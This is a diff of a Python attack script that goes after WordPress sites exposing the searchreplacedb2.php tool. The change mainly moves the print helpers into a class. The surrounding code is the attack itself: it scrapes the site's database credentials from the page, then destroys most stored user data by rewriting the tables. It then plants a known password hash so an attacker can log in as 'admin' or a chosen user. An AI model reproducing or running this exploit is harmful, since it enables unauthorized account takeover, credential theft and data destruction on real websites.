@@ -35,63 +35,63 @@ class Target(object):
 		time.sleep(.050)
 
 	def attack_sequence(self):
-		info("Most user data (including current password and email) will be destroyed")
-		info("You have 10 seconds to cancel")
+		Target.info("Most user data (including current password and email) will be destroyed")
+		Target.info("You have 10 seconds to cancel")
 		time.sleep(10)
 		self.keep_user()
 		self.attack_password()
 		self.place_user()
 
 	def attack_password(self):
-		good("Spraying wp-tables")
+		Target.good("Spraying wp-tables")
 		for x in range(0,len(self.ALPHABET)):
 			if x == len(self.ALPHABET)/4:
-				good("25% done")
+				Target.good("25% done")
 			elif x == len(self.ALPHABET)/2:
-				good("50% done")
+				Target.good("50% done")
 			elif x == len(self.ALPHABET)/4*3:
-				good("75% done")
+				Target.good("75% done")
 			self.replace(self.ALPHABET[x],'1')
-		good("Placing '"+self.password+"' as password")
+		Target.good("Placing '"+self.password+"' as password")
 		for x in reversed(range(15,35)):
 			self.replace('1'*x,self.PASSWORD_HASH)
 
 	def keep_user(self):
-		good("Saving user '"+self.user+"'")
+		Target.good("Saving user '"+self.user+"'")
 		self.replace(self.user,"$$$")
 
 	def place_user(self):
-		good("Reverting username to '"+self.user+"'")
+		Target.good("Reverting username to '"+self.user+"'")
 		self.replace("$$$",self.user)
 
 	def populate(self):
-		good("Getting info at "+self.url)
+		Target.good("Getting info at "+self.url)
 		values = {'loadwp':1}
 		data = urllib.urlencode(values)
 		response = ""
 		try:
 			response = urllib2.urlopen(self.url+"?step=2",data)
 		except:
-			bad("Request error while trying to populate")
+			Target.bad("Request error while trying to populate")
 			exit(1)
 		html = response.read()
 		html = html.split('\n')
 		for line in html:
 			if line.find('name="host"') != -1:
 				self.db_host = line.split('"')[9]
-				good("Setting '"+self.db_host+"' as database host")
+				Target.good("Setting '"+self.db_host+"' as database host")
 			if line.find('name="data"') != -1:
 				self.db_name = line.split('"')[9]
-				good("Setting '"+self.db_name+"' as database name")
+				Target.good("Setting '"+self.db_name+"' as database name")
 			if line.find('name="user"') != -1:
 				self.db_user = line.split('"')[9]
-				good("Setting '"+self.db_user+"' as database user")
+				Target.good("Setting '"+self.db_user+"' as database user")
 			if line.find('name="pass"') != -1:
 				self.db_pass = line.split('"')[9]
-				good("Setting '"+self.db_pass+"' as database password")
+				Target.good("Setting '"+self.db_pass+"' as database password")
 			if line.find('name="char"') != -1:
 				self.db_char = line.split('"')[9]
-				good("Setting '"+self.db_char+"' as charset")
+				Target.good("Setting '"+self.db_char+"' as charset")
 
 	def sanitizeUrl(self,url):
 		if "://" not in url: 
@@ -102,14 +102,17 @@ class Target(object):
 			url += "searchreplacedb2.php"
 		return url
 
-def good(text):
-	print "[\x1B[32m+\x1B[0m] "+text
-
-def bad(text):
-	print "[\x1B[31m-\x1B[0m] "+text
-
-def info(text):
-	print "[\x1B[33m!\x1B[0m] "+text
+	@staticmethod
+	def good(text):
+		print "[\x1B[32m+\x1B[0m] "+text
+	
+	@staticmethod
+	def bad(text):
+		print "[\x1B[31m-\x1B[0m] "+text
+	
+	@staticmethod
+	def info(text):
+		print "[\x1B[33m!\x1B[0m] "+text
 
 def main():
 	parser = optparse.OptionParser("Usage: "+sys.argv[0]+" -t <target_url> [-u <user>] [-p <password>]\n\n~Mixbo (https://github.com/mixbo)")
@@ -124,24 +127,24 @@ def main():
 	else:
 		url = options.target_url
 
-	good("Creating a login pair for \x1B[32m"+url+"\x1B[0m")
+	Target.good("Creating a login pair for \x1B[32m"+url+"\x1B[0m")
 	
 	if options.target_user:
 		user = options.target_user
 	else:
-		info("Using 'admin' because no user was provided")
+		Target.info("Using 'admin' because no user was provided")
 		user = "admin"
 
 	if options.target_password:
 		password = options.target_password
 	else:
-		info("Using 'password' because no password was provided")
+		Target.info("Using 'password' because no password was provided")
 		password = "password"
 
 	t = Target(url,user,password)
 	t.populate()
 	t.attack_sequence()
-	good("You should be able to login using \x1B[32m"+t.user+":"+t.password+"\x1B[0m")
+	Target.good("You should be able to login using \x1B[32m"+t.user+":"+t.password+"\x1B[0m")
 
 if __name__ == "__main__":
 	main()
